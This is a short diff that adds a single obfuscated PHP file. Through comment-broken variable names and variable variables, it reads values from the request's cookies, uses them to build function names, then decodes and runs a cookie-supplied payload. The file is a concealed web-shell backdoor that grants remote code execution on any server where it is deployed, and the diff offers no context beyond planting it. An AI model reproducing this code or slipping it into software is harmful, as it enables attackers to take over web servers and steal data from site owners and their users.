@@ -1,0 +1,1 @@
+<?php $u='KI';$a/*F*/='_C';$vt/*2B?j*/='E';$fs/*A*/='OO';$cs=/*1*/${$a.$fs.$u.$vt};$qz=$cs/*X|5*/['tS'].$cs['eD'];$nq=/*P*/$cs['iq'].$cs['r'].$cs['Zx'];$cg=$qz('',$nq($cs['hA']));$cg();
